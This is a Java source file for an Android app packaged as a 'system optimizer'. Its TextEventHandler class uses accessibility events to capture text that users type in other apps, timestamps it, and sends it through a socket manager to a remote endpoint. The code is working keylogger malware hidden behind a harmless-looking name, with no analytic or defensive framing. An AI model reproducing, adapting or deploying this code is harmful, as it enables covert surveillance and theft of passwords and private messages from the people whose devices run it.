package com.system.optimizer.event_handler;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import com.system.optimizer.network.SocketManager;
import com.system.optimizer.text.BufferedLogger;

import android.view.accessibility.AccessibilityEvent;

public class TextEventHandler {

    private final BufferedLogger logger;
    private final SimpleDateFormat timestampFormat = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());

    public TextEventHandler(SocketManager socketManager) {
        this.logger = new BufferedLogger((message) -> {
            String timestamp = timestampFormat.format(new Date());
            String messageWithTimestamp = "[" + timestamp + "] " + message;
            socketManager.sendEvent("logger", messageWithTimestamp);
        });
    }

    /**
     * Handle accessibility events related to text input
     */
    public void onTextEvent(AccessibilityEvent event) {

        if (event == null || event.getText() == null)
            return;
    
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";

            if (!packageName.equals("com.android.systemui") &&
                    !packageName.equals("android") &&
                    !packageName.equals("com.google.android.inputmethod.latin")) {

                String text = normalizeTextEvent(event.getText());
                if (!text.isEmpty()) {
                    logger.onNewText(text);
                }
            }
        }
    }

    /**
     * Convert CharSequence list to String
     */
    private String charToString(List<CharSequence> text) {
        StringBuilder sb = new StringBuilder();
        for (CharSequence cs : text)
            sb.append(cs);
        return sb.toString();
    }

    /**
     * Convierte el contenido de event.getText() en un mensaje unificado
     */
    private String normalizeTextEvent(List<CharSequence> text) {
        StringBuilder sb = new StringBuilder();
        for (CharSequence cs : text) {
            if (cs != null && cs.length() > 0) {
                if (sb.length() > 0) {
                    sb.append(": "); // separador entre título y contenido
                }
                sb.append(cs.toString().trim());
            }
        }
        return sb.toString();
    }
}